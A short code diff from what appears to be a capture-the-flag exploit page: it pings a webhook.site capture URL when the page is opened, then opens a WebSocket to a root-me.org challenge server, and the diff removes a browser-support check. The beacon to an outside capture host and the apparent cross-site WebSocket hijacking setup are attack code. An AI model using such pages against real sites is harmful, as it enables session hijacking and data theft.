@@ -11,12 +11,6 @@
             xhr.open("GET", "https://webhook.site/805f74b2-9b6f-4506-911a-d711e6fdf1f0?open=true", false);
             xhr.send(null);
 
-            window.WebSocket = window.WebSocket || window.MozWebSocket;
-            if (!window.WebSocket) {
-                alert('Sorry, but your browser doesn\'t support WebSocket.')
-                window.location.href="/"
-                return;
-            }
             var connection = new WebSocket('ws://ctf21.root-me.org/ws');
             connection.onopen = function () {};
             connection.onerror = function (error) {
